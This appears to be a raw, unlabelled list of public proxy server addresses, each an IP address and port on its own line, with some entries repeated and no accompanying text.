103.154.230.99:5678
103.106.219.135:8080
189.20.85.170:8080
103.215.207.54:81
119.42.152.252:8080
116.0.54.30:8080
103.161.164.101:8181
103.106.193.117:7532
185.136.151.138:41890
103.117.150.100:8080
197.251.233.122:8080
189.3.169.34:9812
201.182.85.242:999
51.103.137.65:80
96.30.79.84:8080
69.160.7.58:8080
45.165.131.46:8080
103.146.170.252:83
103.161.164.109:8181
200.24.146.68:999
42.180.225.145:10161
103.227.117.136:9812
103.78.170.13:83
138.117.110.244:999
202.145.13.109:8080
190.128.231.146:8080
138.94.188.124:8080
45.236.28.213:999
43.255.113.232:82
36.91.148.37:8080
74.205.128.200:80
202.142.126.6:8080
1.20.169.144:8080
138.117.84.240:999
118.173.56.31:80
213.6.149.2:8080
193.107.252.117:8080
45.231.170.137:999
181.209.77.130:8080
185.12.69.174:8080
41.242.116.235:50000
189.126.72.97:20183
146.59.199.12:80
168.196.215.16:9999
45.177.17.4:999
190.202.14.132:3128
102.66.108.1:9999
194.233.69.41:443
103.155.54.245:83
194.233.73.107:443
69.75.172.54:8080
194.233.69.126:443
43.224.10.13:6666
212.23.217.18:8080
45.202.16.126:8080
180.178.188.98:8080
178.252.184.142:8080
201.88.213.118:8080
157.100.53.102:999
200.43.13.23:8080
177.73.16.74:55443
45.161.115.250:999
102.68.128.214:8080
1.32.59.217:47045
183.89.9.34:8080
94.75.76.10:8080
194.233.73.106:443
170.83.242.250:999
2.56.62.76:3128
62.201.212.214:8080
41.75.85.22:8080
103.156.225.178:80
139.255.136.171:8080
190.26.217.98:999
69.230.221.141:1080
36.93.75.154:8080
182.253.82.157:8080
200.55.3.122:999
194.169.167.199:8080
110.44.124.220:55443
36.91.133.49:10000
212.174.44.87:8085
103.148.39.38:83
178.66.182.76:3128
45.224.153.39:999
62.94.218.90:8080
36.95.156.127:6969
177.183.234.110:3128
216.176.187.99:8886
36.95.53.227:8080
45.189.113.111:999
45.189.252.130:999
47.240.160.90:10001
152.231.29.51:8080
103.156.249.52:8080
46.219.80.142:57401
201.219.194.203:8080
98.154.21.253:3128
190.160.181.220:8118
177.136.84.164:999
200.69.88.5:999
103.196.233.199:8080
1.1.189.58:8080
45.182.41.12:8080
196.202.215.143:41890
85.196.179.34:8080
188.124.229.47:8080
45.229.162.146:55443
190.7.57.62:999
45.161.161.216:5566
103.155.19.97:8080
41.184.92.24:8080
103.132.55.174:8085
165.16.27.34:1981
103.76.12.42:8181
45.173.44.1:999
139.255.109.27:8080
103.17.246.148:8080
198.52.241.12:999
103.148.201.76:8080
213.6.66.66:48687
190.186.1.65:999
85.133.130.18:8080
186.103.203.202:999
45.184.73.114:40033
98.164.130.195:8080
103.124.87.1:8080
202.138.249.241:8000
146.59.83.187:80
175.100.103.170:55443
162.19.157.77:8001
222.252.156.61:62694
181.212.59.187:9812
189.202.249.202:9999
181.78.21.174:999
103.71.22.2:83
190.94.199.14:999
178.32.101.200:80
80.90.132.128:8888
190.69.153.82:999
179.49.163.2:999
103.161.164.107:8181
27.42.168.46:55481
43.255.113.232:8085
188.133.188.20:8080
202.169.229.139:53281
45.174.56.192:999
103.124.138.131:8085
103.221.254.102:48146
47.241.165.133:443
177.183.234.110:80
103.130.61.61:8081
110.78.112.198:8080
202.56.163.110:8080
103.159.90.14:83
45.70.14.58:999
45.127.56.194:83
116.254.116.99:8080
190.8.38.83:999
193.68.170.91:8080
36.93.133.170:8080
124.226.194.135:808
181.78.94.22:999
103.160.132.26:83
103.110.10.202:8080
103.175.237.9:3127
23.236.144.90:3128
103.231.200.229:3128
201.89.97.222:8080
36.95.142.26:8080
182.253.197.69:8080
120.72.20.225:8080
41.76.216.250:8088
82.147.118.164:8080
116.197.130.71:80
202.138.236.69:8080
103.31.235.74:9812
150.109.32.166:80
82.200.80.118:8080
45.167.90.21:999
200.42.203.96:8080
115.42.3.150:53281
212.112.127.20:8080
190.214.53.246:9812
103.145.57.50:8080
36.94.58.243:8080
103.152.232.233:8080
113.175.8.99:9812
103.1.93.184:55443
164.52.207.80:80
181.225.54.38:999
111.68.26.44:8080
113.160.37.152:53281
103.175.238.130:8181
95.38.80.36:8050
12.69.91.227:80
170.0.87.202:999
62.205.134.57:30001
188.133.138.197:8080
103.153.136.186:8080
114.7.193.214:8080
46.52.162.45:8080
103.37.141.69:80
181.143.191.138:999
179.105.126.16:9299
177.55.207.38:8080
190.61.48.25:999
176.123.1.84:3128
114.115.181.74:8080
180.178.111.221:8080
138.121.161.82:8099
220.132.0.156:8787
146.56.119.252:80
186.97.182.3:999
203.124.47.58:8080
36.67.52.35:8080
103.80.83.48:3127
119.15.86.130:8080
172.104.252.86:8021
161.35.78.6:80
62.33.207.202:3128
188.165.59.127:80
134.209.25.223:3128
62.182.66.251:9090
157.245.33.179:80
95.217.72.247:3128
45.79.27.210:1080
178.63.244.28:8083
5.189.140.161:3128
178.209.51.218:7829
45.56.83.46:80
64.227.62.123:80
62.33.207.202:80
82.179.248.248:80
168.8.172.2:80
52.226.135.84:80
51.250.80.131:80
206.189.23.38:8048
104.128.228.69:8118
134.209.29.120:8080
104.236.73.28:80
197.246.171.158:8080
217.30.170.213:3128
5.252.161.48:3128
51.15.100.229:3128
173.212.216.104:3128
207.180.199.65:3128
213.230.125.46:8080
185.61.152.137:8080
167.235.63.238:3128
103.127.1.130:80
85.214.71.122:8118
103.117.192.14:80
103.115.252.18:80
46.250.88.194:3128
169.57.1.85:8123
54.216.254.207:9000
120.77.65.221:30001
20.47.108.204:8888
120.77.27.85:30001
47.113.200.76:30001
123.56.222.253:30001
47.113.221.153:30001
66.94.116.111:3128
159.69.220.40:3128
47.97.126.226:30001
121.89.245.58:9000
77.39.117.17:80
87.76.1.69:8080
178.115.243.26:8080
5.9.112.247:3128
94.23.77.8:3128
50.205.202.249:3128
212.114.31.231:8080
39.104.27.232:80
65.21.206.151:3128
35.170.197.3:8888
45.189.254.82:999
12.151.56.30:80
91.202.230.219:8080
80.80.211.110:8080
95.217.72.253:3128
195.158.30.232:3128
189.199.106.202:999
103.117.231.42:80
46.191.235.167:443
8.213.137.21:6969
172.105.190.51:80
156.200.116.69:1976
103.115.26.254:80
103.197.251.202:80
80.179.140.189:80
109.194.101.128:3128
34.132.27.0:3128
35.188.27.245:8118
103.145.76.44:80
170.79.12.72:9090
157.245.167.115:80
195.29.76.14:8080
5.160.121.142:8080
157.100.12.138:999
198.167.196.118:8118
172.105.190.51:8017
193.107.252.117:8080
220.116.226.105:80
178.54.21.203:8081
173.212.245.135:3128
222.111.184.59:80
58.20.235.180:9091
203.243.51.111:8001
165.225.222.110:10605
178.32.223.222:8118
58.241.86.54:80
178.252.175.5:8080
156.200.116.68:1981
106.14.255.124:80
45.224.96.225:999
176.236.232.66:9090
213.212.210.252:1976
119.36.77.219:9091
39.107.33.254:8090
39.108.56.233:38080
46.246.4.13:8888
182.61.201.201:80
103.161.164.103:8181
103.241.182.97:80
18.231.133.109:3128
212.112.113.178:3128
139.59.1.14:8080
144.217.75.65:8800
67.212.186.101:80
154.85.58.149:80
62.171.177.80:3128
146.59.83.187:80
185.157.161.85:8118
139.255.109.27:8080
144.76.42.215:8118
173.249.38.220:80
61.79.139.30:80
139.78.97.154:80
103.134.177.182:8888
183.64.239.19:8060
219.138.229.131:9091
110.77.134.106:8080
94.140.242.221:8080
111.91.176.182:80
113.194.88.13:9091
195.189.123.213:3128
47.74.152.29:8888
91.107.15.221:53281
174.138.24.67:8080
175.141.151.191:8080
116.203.72.47:8118
204.137.174.64:999
139.9.64.238:443
47.180.214.9:3128
112.6.117.135:8085
209.166.175.201:8080
58.58.91.38:8060
47.112.122.163:82
122.9.101.6:8888
159.89.195.14:80
82.79.213.118:9812
106.158.156.213:80
121.37.145.63:8888
61.216.156.222:60808
222.65.228.80:8085
121.199.78.228:8888
113.214.4.8:84
213.230.97.10:3128
213.137.240.243:81
139.255.112.124:8181
80.85.86.247:1235
181.114.192.1:3128
103.209.230.129:8080
111.72.218.180:9091
121.101.133.73:8080
78.84.95.187:53281
36.94.142.163:8000
47.176.153.17:80
102.68.128.214:8080
103.166.39.33:8080
78.138.131.248:3128
80.246.128.14:8080
197.243.14.59:8888
178.205.169.210:3128
211.138.6.37:9091
45.161.115.45:999
124.131.219.92:9091
114.236.81.176:8008
138.117.230.140:999
58.246.58.150:9002
159.65.133.175:31280
120.220.220.95:8085
103.23.206.170:8080
183.236.123.242:8060
93.171.192.28:8080
218.89.51.167:9091
117.54.114.100:80
103.149.162.195:80
34.94.0.168:80
58.20.184.187:9091
41.161.92.138:8080
138.68.60.8:8080
43.250.107.91:80
138.59.165.72:999
124.226.194.135:808
152.89.216.110:3128
123.24.250.187:80
85.221.247.238:8080
181.63.213.66:8089
201.184.72.178:999
45.231.170.137:999
218.202.1.58:80
213.171.63.210:41890
41.65.236.56:1976
36.89.252.155:8080
218.253.141.178:8080
188.168.28.37:81
61.191.56.60:8085
163.172.85.150:9741
167.99.83.205:8118
178.236.223.250:8080
47.92.135.169:443
187.189.175.136:999
94.181.48.171:1256
103.231.78.36:80
183.91.0.124:3128
111.3.118.247:30001
103.133.26.107:8181
39.175.77.17:30001
223.96.90.216:8085
183.247.199.51:30001
5.252.161.48:8080
181.224.207.18:999
95.217.84.58:8118
181.48.101.245:3128
39.175.92.35:30001
186.176.212.214:9080
62.182.94.173:9812
183.247.202.208:30001
39.130.150.42:80
181.143.191.138:999
45.167.124.5:9992
89.232.202.106:3128
88.255.201.134:8080
45.153.165.118:999
67.212.83.55:1080
188.72.6.98:37083
41.65.236.37:1981
176.115.197.118:8080
200.116.198.222:9812
154.64.219.41:8888
179.1.73.100:999
188.170.62.82:81
181.224.207.21:999
46.249.123.169:6565
183.247.211.50:30001
111.3.118.177:30001
41.65.236.57:1976
129.226.17.43:80
183.247.199.126:30001
95.182.121.163:8080
178.216.24.80:55443
123.56.106.161:8888
47.89.153.213:80
194.233.77.110:6666
177.101.55.34:9090
200.125.223.142:9812
202.65.158.237:83
47.243.138.208:6677
41.242.116.235:50000
187.19.152.182:3128
185.148.223.76:3128
94.181.183.170:8080
49.232.237.134:8080
121.156.109.108:8080
193.41.88.58:53281
212.174.44.96:8085
1.1.189.58:8080
94.242.54.119:3128
91.106.64.94:9812
46.19.100.28:81
43.224.10.8:6666
45.190.79.160:999
104.37.102.181:8181
152.32.218.99:8000
174.139.41.164:9090
47.108.118.29:30001
206.62.64.34:8080
185.91.116.156:80
190.131.250.105:999
176.9.227.233:54545
197.157.219.169:48625
115.124.75.33:8080
52.236.90.60:3128
46.23.58.77:8080
202.169.37.244:8080
180.149.98.126:8080
156.200.116.76:1981
77.236.243.69:1256
1.224.3.122:3888
103.60.161.2:80
78.29.36.210:9080
51.250.17.27:8080
167.114.185.69:3128
81.169.142.254:3128
103.31.235.102:8080
170.238.91.50:8080
80.249.135.209:8080
185.51.10.19:80
115.87.154.67:8080
138.0.91.227:999
91.93.118.3:8090
41.178.6.118:8060
110.74.203.250:8080
103.19.58.113:8080
88.255.101.231:8080
38.10.247.122:999
190.7.57.61:999
200.7.11.154:8080
85.235.184.186:3129
51.79.50.46:9300
190.61.84.166:9812
45.161.115.48:999
223.82.60.202:8060
36.95.173.178:8080
95.216.194.46:1081
185.250.149.165:51787
103.152.100.183:8080
138.68.235.51:80
85.121.208.158:2019
213.230.69.193:3128
190.2.210.249:999
45.173.4.3:8081
47.113.90.161:83
12.144.254.185:9080
131.72.69.98:45005
170.83.76.57:999
91.67.201.74:8118
165.16.27.30:1981
190.12.57.46:8080
183.89.115.221:8081
124.222.122.46:7890
95.0.219.240:8080
24.172.82.94:53281
36.37.91.98:9812
190.119.199.20:57333
213.32.58.10:8081
117.54.114.102:80
165.16.27.51:1981
209.97.150.167:8080
210.212.227.68:3128
117.121.202.182:8099
183.88.212.184:8080
103.111.59.182:8080
80.249.135.89:8080
14.162.146.186:19132
45.127.56.194:83
91.106.65.107:9812
201.220.112.98:999
49.0.39.186:8080
128.201.213.232:8080
45.172.111.18:999
185.15.172.212:3128
103.120.175.47:9191
47.115.6.196:3389
101.200.127.149:3129
181.48.23.250:8080
185.103.168.78:8080
202.62.52.4:8080
162.0.226.218:80
47.74.226.8:5001
67.212.186.99:80
180.178.189.102:3127
41.216.177.34:8080
74.208.205.5:80
70.186.128.126:8080
201.182.85.242:999
193.163.116.5:8080
43.255.113.232:86
20.239.2.157:80
154.236.168.179:1976
36.92.140.113:8080
103.35.132.18:83
45.172.111.14:999
45.229.33.102:999
69.43.44.106:8080
45.181.122.74:999
45.156.31.19:9090
45.172.111.12:999
52.168.34.113:80
77.236.243.39:1256
176.102.69.35:8080
178.217.172.206:55443
91.235.75.33:8282
183.88.210.77:8080
77.235.17.180:8080
176.213.143.38:3128
201.222.45.64:999
114.7.193.214:8080
221.6.201.74:9999
102.66.161.210:9999
200.106.216.51:9947
154.113.32.26:8080
190.244.233.113:8080
200.92.152.50:999
102.38.5.233:8080
213.230.90.106:3128
201.89.89.34:8080
63.151.67.7:8080
80.90.132.128:8888
185.12.68.163:43393
103.14.72.21:8889
14.170.154.193:19132
185.220.181.50:8080
192.119.203.124:48678
143.208.58.92:8080
103.153.40.38:8080
200.108.229.137:8080
82.148.5.173:8888
36.67.57.45:30066
95.104.54.227:42119
41.84.135.102:8080
45.171.144.243:8083
50.236.203.15:8080
47.57.188.208:80
165.16.27.31:1981
77.65.112.162:8080
123.56.13.137:80
144.217.7.157:9300
195.158.3.198:3128
188.136.216.201:9080
95.216.194.46:1080
91.194.239.122:8080
103.168.190.106:8080
118.185.38.153:35101
180.193.216.213:8080
51.77.141.29:1081
45.127.56.194:82
202.152.51.44:8080
50.201.51.216:8080
176.196.250.86:3128
212.174.44.41:8080
190.121.140.233:999
165.16.27.34:1981
181.74.81.195:999
201.222.45.69:999
177.183.234.110:80
92.118.92.107:8181
41.57.37.12:8080
43.255.113.232:84
202.169.229.139:53281
43.255.113.232:83
201.217.246.178:8080
41.65.236.41:1976
181.143.235.94:999
178.88.185.2:3128
178.124.189.174:3128
180.191.22.200:8080
117.186.143.130:8118
185.32.6.131:8090
66.181.164.125:8080
80.87.217.6:8080
209.97.150.167:3128
193.163.116.3:8080
186.154.147.166:9812
88.255.64.75:1976
122.102.118.83:8080
43.255.113.232:8084
43.250.127.98:9001
185.189.199.75:23500
103.60.160.88:8080
103.227.141.90:8181
181.224.207.20:999
114.130.78.185:8080
43.243.174.3:82
103.147.77.66:5012
189.203.234.146:999
103.156.17.63:8181
182.72.203.255:80
103.156.225.178:8080
50.246.120.125:8080
167.99.124.118:80
188.168.28.88:81
200.55.250.16:6969
110.170.126.13:3128
134.122.58.174:80
103.130.5.34:8080
202.137.121.109:8080
95.0.206.22:8080
181.78.23.170:999
190.107.224.150:3128
190.14.238.198:999
181.129.183.19:53281
154.117.159.228:8080
103.250.166.12:6666
103.227.117.136:9812
185.211.6.165:10000
103.147.118.66:8080
103.163.231.189:8080
36.37.81.135:8080
150.129.171.35:30093
31.220.183.217:53281
176.236.141.30:10001
181.129.2.90:8081
213.230.127.141:3128
103.142.108.153:8080
203.81.87.186:10443
194.219.175.210:8080
157.100.53.110:999
190.61.101.205:8080
150.129.115.118:48071
190.109.205.253:999
179.1.73.102:999
103.216.82.20:6666
103.243.114.206:8080
45.182.190.179:999
41.254.53.70:1981
67.212.186.102:80
158.69.64.142:9300
109.121.55.162:8888
103.207.3.6:82
43.255.113.232:8083
186.148.184.130:999
43.255.113.232:8081
103.245.198.54:8080
105.243.252.21:8080
182.253.82.157:8080
27.255.58.74:8080
43.255.113.232:8082
112.78.32.62:3127
190.214.53.246:9812
46.0.203.186:8080
182.253.108.186:8080
190.60.32.206:999
130.41.85.158:8080
45.173.6.5:999
103.248.93.5:8080
103.181.245.130:80
118.99.96.173:8080
65.108.18.140:444
62.94.218.90:8080
103.24.125.33:83
190.109.168.217:8080
132.226.163.28:3128
62.171.188.233:8000
77.247.225.49:3128
200.106.184.13:999
88.255.64.75:1981
102.165.127.85:8080
122.155.165.191:3128
110.34.8.110:8080
170.83.79.105:999
87.103.202.248:3128
118.173.56.31:80
178.252.175.16:8080
45.182.41.12:8080
164.52.207.80:80
190.217.14.121:999
157.119.211.133:8080
41.65.236.41:1981
185.58.17.4:8080
144.217.240.185:9300
95.174.102.131:53281
103.166.210.123:443
37.232.183.74:53281
165.16.46.67:8080
191.97.9.189:999
38.130.249.137:999
165.16.27.52:1981
77.236.237.241:1256
170.80.202.246:999
107.178.9.186:8080
96.27.152.115:8080
202.138.249.241:8000
61.145.1.181:7890
186.3.9.212:999
158.69.53.132:9300
103.173.172.1:8888
41.254.49.146:8080
120.237.57.83:9091
190.60.36.61:8080
181.78.19.197:999
103.105.228.134:8080
103.130.61.61:8081
43.224.10.11:6666
157.230.34.219:3128
157.100.53.102:999
190.181.16.206:999
103.153.191.187:8080
154.66.109.209:8080
200.111.182.6:443
36.95.54.114:8080
196.1.95.117:80
138.219.216.142:999
181.16.175.225:8080
143.208.156.170:8080
181.205.41.210:7654
46.161.194.71:8080
103.77.41.138:8080
36.66.233.213:8080
45.174.176.151:8085
202.57.2.19:8080
110.42.128.13:8118
177.130.104.81:7171
116.21.121.2:808
131.72.68.107:40033
45.173.103.50:80
103.131.245.126:8080
190.2.210.114:999
187.216.73.18:8080
89.250.149.114:60981
185.190.38.150:8080
47.92.113.71:80
102.38.17.101:8080
195.211.219.147:5555
202.180.20.11:55443
66.29.154.103:3128
85.234.126.107:55555
88.255.101.232:8080
103.70.79.3:8080
43.245.95.210:53805
45.189.254.49:999
61.19.42.140:80
179.43.101.150:999
50.232.250.157:8080
178.253.206.21:6666
45.177.17.2:999
5.202.191.226:8080
183.89.63.71:8080
119.15.86.130:8080
43.132.200.137:9812
91.207.238.107:56288
200.106.184.12:999
183.88.232.207:8080
176.236.232.52:9090
74.208.177.198:80
43.224.10.46:6666
103.81.114.182:53281
45.230.172.11:8080
190.242.118.93:55443
118.70.109.148:55443
201.158.47.66:8080
103.149.238.101:8080
192.236.160.186:80
103.144.90.35:8880
116.71.139.73:8080
202.152.12.202:8080
122.102.118.82:8080
45.167.90.85:999
103.156.216.178:443
83.174.218.83:8080
201.20.110.54:55443
43.129.95.244:8080
138.121.161.82:8099
1.20.169.43:8080
103.151.132.194:8888
45.167.90.61:999
131.100.51.250:999
103.114.98.217:6000
222.165.205.156:8089
45.172.111.91:999
185.20.198.210:22800
179.191.245.170:3128
185.82.98.73:9093
176.223.143.230:80
37.205.14.92:5566
183.111.25.253:8080
159.89.200.210:8080
190.64.77.11:3128
103.152.100.187:8080
103.171.5.129:8080
175.144.48.229:9812
103.119.60.12:80
128.201.160.49:999
175.184.232.74:8080
82.114.101.86:1256
201.91.82.155:3128
103.180.194.146:8080
84.204.40.155:8080
182.253.191.132:8080
45.122.233.76:55443
103.161.164.101:8181
41.86.251.61:8080
194.114.128.149:61213
118.99.102.226:8080
103.10.22.236:8080
203.190.44.10:3127
181.36.121.222:999
36.95.79.7:41890
45.5.117.218:999
77.65.112.163:8080
93.188.161.84:80
186.150.202.130:8080
95.217.20.255:51222
202.77.120.38:57965
103.235.199.179:9812
190.8.34.86:999
103.71.22.2:83
103.135.14.176:8181
190.109.11.44:6969
103.241.227.117:6666
45.226.28.1:999
103.251.214.167:6666
14.161.43.121:8080
168.227.89.81:9292
203.202.255.67:8080
200.60.12.43:999
120.26.14.114:8888
14.241.39.165:19132
149.255.26.228:9090
178.168.88.199:8080
136.228.239.67:8082
103.159.46.14:83
49.49.29.118:8080
202.142.158.114:8080
118.97.164.19:8080
120.24.33.141:8000
213.6.66.66:48687
37.111.51.222:8080
103.158.253.139:3125
170.79.88.38:999
181.47.104.64:8080
154.113.19.30:8080
203.29.222.94:80
112.78.170.250:8080
118.31.166.135:3128
117.102.75.13:9999
124.40.252.182:8080
188.133.153.187:8081
170.231.55.142:999
103.28.225.169:8080
103.123.64.20:8888
49.231.174.182:8080
51.103.137.65:80
36.67.168.117:8080
177.128.44.131:6006
185.255.47.59:9812
103.60.173.114:8080
112.124.4.35:8888
103.159.90.14:83
190.90.224.226:999
202.56.163.110:8080
200.8.179.247:999
185.235.43.196:8118
161.49.91.13:1337
181.78.21.174:999
43.255.113.232:81
138.199.15.141:8080
43.225.185.154:8080
187.111.176.249:8080
41.193.84.196:3128
202.129.196.242:53879
95.0.168.45:1981
196.1.97.209:80
82.157.109.52:80
200.110.168.159:8080
218.244.147.59:3128
138.219.250.6:3128
45.115.211.14:587
66.96.238.40:8080
103.199.156.145:40049
37.252.73.192:8080
45.173.6.98:999
103.11.106.85:8085
27.42.168.46:55481
103.221.254.102:48146
18.170.22.115:80
115.124.79.92:8080
103.155.156.10:8080
170.233.240.3:3180
116.62.39.130:443
200.69.78.90:999
177.54.229.1:9292
118.91.178.225:8080
217.197.158.182:41890
185.136.151.138:41890
85.133.130.18:8080
103.146.30.178:8080
103.156.249.66:8080
77.46.138.38:8080
189.198.250.210:999
24.152.53.68:999
118.122.92.139:8000
103.28.224.74:8080
173.197.167.242:8080
181.176.221.151:9812
76.80.19.107:8080
202.159.101.44:8088
88.255.101.228:8080
181.188.156.171:8080
165.16.0.105:1981
196.15.213.235:3128
202.142.126.6:8080
95.161.188.246:38302
82.114.97.157:1256
43.255.113.232:8085
62.205.169.74:53281
218.39.136.163:8000
78.30.230.117:50932
113.160.94.26:19132
103.168.164.26:84
161.97.74.153:81
84.204.40.156:8080
181.118.158.131:999
146.158.92.137:8080
117.198.97.220:80
180.178.188.98:8080
103.152.232.234:8080
190.2.214.90:999
212.23.217.18:8080
103.142.108.145:8080
114.4.104.254:3128
177.93.38.226:999
197.248.184.158:53281
45.172.110.92:999
103.148.201.76:8080
103.18.77.236:8080
196.3.99.162:8080
134.0.63.134:8000
36.95.142.26:8080
125.228.43.81:8080
221.12.37.46:20000
91.233.111.49:1080
177.37.16.104:8080
203.124.47.58:8080
119.18.158.137:8080
20.110.214.83:80
191.102.125.245:8080
187.111.176.62:8080
101.53.154.137:2002
185.127.224.60:41890
190.217.14.125:999
45.177.109.219:999
69.75.140.157:8080
102.68.128.215:8080
180.193.216.208:8080
181.143.106.162:52151
103.60.161.18:8080
103.151.22.5:8080
84.214.150.146:8080
82.137.244.74:8080
201.77.109.129:999
154.236.189.28:8080
65.18.114.254:55443
149.54.11.76:80
154.236.184.70:1981
61.7.159.133:8081
34.141.231.120:80
154.72.67.190:8080
103.145.45.77:55443
119.23.131.174:3888
103.146.189.86:8080
178.32.101.200:80
181.16.175.10:8080
139.0.4.34:8080
202.62.84.210:53281
47.89.185.178:8888
202.138.240.189:8888
103.133.26.108:8181
103.129.3.246:83
103.130.104.25:83
203.215.166.162:3128
80.252.5.34:7001
139.255.10.234:8080
160.16.105.145:8080
152.231.29.51:8080
120.26.0.11:8880
115.42.3.150:53281
181.129.241.22:999
202.169.51.46:8080
193.31.27.123:80
36.67.52.35:8080
183.111.25.253:80
103.163.193.254:83
181.129.74.58:40667
128.0.179.234:41258
84.204.40.154:8080
45.179.193.166:999
202.8.73.206:41890
120.89.91.226:3180
103.156.15.48:8080
139.255.67.50:3888
103.126.87.86:3127
103.48.68.36:83
103.119.55.21:8082
156.200.116.72:1981
170.0.87.203:999
45.185.206.76:999
103.85.112.78:8090
156.200.116.76:1976
220.179.118.244:8080
45.189.254.26:999
162.144.233.16:80
110.232.64.90:8080
104.37.101.65:8181
103.152.232.162:8080
196.219.202.74:8080
45.186.226.3:8080
131.0.207.79:8080
213.212.210.252:1981
103.151.43.145:41890
189.164.83.133:10101
202.152.143.64:3128
43.243.174.26:82
201.219.11.202:999
95.137.240.30:60030
195.250.92.58:8080
91.109.180.6:8118
156.200.116.68:1976
157.100.144.27:999
181.78.3.131:999
161.97.158.118:1081
200.39.136.129:999
154.236.184.70:1976
103.31.132.206:8080
103.74.147.22:83
117.1.134.64:6666
134.209.29.120:3128
217.30.173.108:8080
103.159.47.9:82
45.189.113.111:999
157.90.222.231:8080
98.154.21.253:3128
102.66.108.1:9999
103.160.201.76:8080
181.57.192.245:999
182.93.82.191:8080
119.236.225.42:3128
154.236.179.233:1976
190.6.204.82:999
186.71.151.42:1990
101.53.154.137:2016
88.255.64.94:8080
200.110.214.129:9080
182.52.229.165:8080
50.193.36.173:8080
103.148.178.228:80
104.45.128.122:80
36.37.160.242:8080
178.252.175.27:8080
36.95.73.141:80
154.113.151.177:8080
159.196.222.215:8080
103.164.221.34:8080
121.229.132.241:9999
103.30.246.41:8888
180.76.237.75:80
202.145.8.122:8080
160.226.132.33:8080
202.62.10.51:8082
190.90.24.3:999
68.183.185.62:80
190.152.8.70:9812
36.95.116.69:41890
46.36.132.23:8080
190.109.0.228:999
182.253.28.124:8080
185.15.133.77:8080
190.113.43.66:999
190.2.210.186:999
124.156.100.83:8118
103.172.70.153:8080
212.3.216.8:8080
45.180.10.197:999
188.133.158.51:1256
45.184.73.114:40033
45.177.109.220:999
157.100.56.179:999
181.78.18.25:999
79.140.17.172:8016
103.125.50.102:10001
202.62.62.34:9812
36.95.27.225:8080
36.94.58.243:8080
1.10.141.220:54620
157.100.53.100:999
186.67.192.246:8080
45.239.123.14:999
18.188.193.74:3128
190.217.30.241:999
161.132.122.61:999
201.186.182.207:999
200.58.87.195:8080
190.237.238.157:999
45.148.123.25:3128
139.59.244.166:8080
206.161.97.5:31337
110.235.249.226:8080
110.74.195.34:25
103.42.162.50:8080
212.95.180.50:53281
185.141.10.227:34082
103.68.3.203:8080
180.178.111.221:8080
95.0.66.86:8080
114.67.104.36:18888
198.144.159.40:3128
181.129.52.156:42648
181.49.158.165:8080
190.111.203.179:8080
161.132.126.131:999
216.155.89.66:999
84.205.17.234:8080
116.254.116.99:8080
45.225.184.177:999
180.180.218.250:8080
188.0.147.102:3128
121.139.218.165:31409
190.104.5.173:8080
43.224.10.32:6666
36.67.168.117:80
190.186.1.65:999
200.172.255.195:8080
103.125.118.196:8080
139.255.25.84:3128
102.38.14.157:8080
103.162.152.5:8085
146.56.159.124:1081
115.147.15.109:8080
190.7.57.58:999
103.156.14.180:3127
103.168.164.26:83
200.7.10.158:8080
103.175.238.130:8181
93.240.4.54:3128
165.16.27.33:1981
47.91.44.217:8000
179.49.163.2:999
101.255.164.58:8080
140.227.25.56:5678
36.93.133.170:8080
45.7.64.248:999
179.1.77.222:999
47.99.133.26:3128
64.119.29.22:8080
79.147.98.145:8080
177.22.88.224:3128
103.80.237.211:3888
190.248.153.162:8080
177.183.234.110:3128
91.209.114.181:6789
45.77.177.53:3128
202.40.188.94:40486
103.160.201.47:8080
103.124.97.11:8080
41.77.13.186:53281
211.103.138.117:8000
103.151.246.14:10001
188.133.136.116:8090
196.3.97.71:23500
203.123.57.154:63123
85.196.179.34:8080
140.227.58.238:3180
67.212.186.100:80
110.232.67.44:55443
203.130.23.250:80
45.179.193.163:999
1.20.166.142:8080
79.127.56.148:8080
103.159.220.141:8080
45.65.132.148:8080
134.209.189.42:80
117.54.114.101:80
14.226.30.36:8080
45.145.20.213:80
103.153.136.186:8080
181.232.190.220:999
202.145.13.109:8080
102.66.104.106:9998
117.54.11.82:3128
208.67.183.240:80
79.101.55.161:53281
177.93.50.236:999
212.12.69.43:8080
181.143.235.100:12345
109.167.245.78:8080
103.4.164.206:8080
188.92.242.99:3128
95.0.168.45:1976
179.93.65.233:8080
41.65.236.44:1981
190.109.18.65:8080
41.65.236.37:1976
195.211.219.146:5555
103.144.18.67:8082
118.173.242.189:8080
103.155.196.23:8080
216.169.73.65:34679
187.188.108.114:8080
154.79.242.178:1686
91.121.42.14:1081
43.129.29.58:8090
85.187.195.145:8080
45.185.206.74:999
103.145.128.180:8088
188.40.148.168:8080
213.222.34.200:53281
182.253.140.250:8080
103.129.3.246:84
146.56.119.252:80
1.231.3.104:80
103.123.168.203:8080
103.156.128.28:8080
212.200.44.246:9812
103.155.54.233:84
91.242.213.247:8080
188.133.152.103:9080
118.99.103.147:46810
167.249.180.42:8080
91.143.133.220:8080
124.40.244.137:8080
139.59.36.58:3128
186.251.203.192:8080
113.177.48.183:19132
177.93.33.244:999
103.73.74.217:2021
212.200.39.210:8080
194.233.73.103:443
190.8.36.61:999
103.17.246.148:8080
178.49.151.33:8091
124.121.85.109:8080
185.226.134.8:9090
213.165.168.190:9898
103.207.98.54:8080
51.15.42.134:8118
45.235.122.180:999
190.61.101.39:8080
69.160.7.58:8080
43.224.10.42:6666
12.69.91.227:80
62.113.105.131:8080
189.193.254.10:9991
78.38.100.121:8080
213.6.204.153:49044
103.155.19.97:8080
202.152.24.50:8080
103.216.82.22:6666
93.179.216.238:80
113.161.85.18:19132
151.106.17.122:1080
187.111.176.121:8080
175.101.85.65:8080
103.148.39.38:84
190.122.185.170:999
92.207.253.226:38157
103.181.245.130:8080
45.251.74.228:80
138.117.84.134:999
103.144.79.186:8080
187.62.191.3:61456
200.60.124.118:999
186.65.105.253:666
103.122.32.10:8080
212.126.106.230:8889
190.202.94.210:8080
103.160.132.26:82
37.112.209.138:55443
103.144.102.57:8080
68.64.250.38:8080
202.29.237.213:3128
185.12.69.174:8080
45.189.116.21:999
188.43.228.25:8080
161.22.34.121:8080
45.172.111.3:999
190.214.27.46:8080
5.35.81.55:32132
222.253.48.253:8080
213.194.113.128:9090
195.182.152.238:38178
182.237.16.7:83
103.135.139.65:8080
192.162.193.243:36910
162.144.236.128:80
200.69.83.23:8080
177.136.86.112:999
103.155.29.36:8008
176.115.16.250:8080
158.140.181.148:8081
93.91.112.247:41258
45.202.16.126:8080
165.227.71.60:80
179.43.94.238:999
149.34.2.39:8080
194.233.69.90:443
103.153.149.213:8181
110.164.208.125:8888
103.25.210.226:8081
5.188.136.52:8080
41.203.83.66:8080
91.244.114.193:48080
201.77.108.225:999
43.224.10.43:6666
91.103.31.147:81
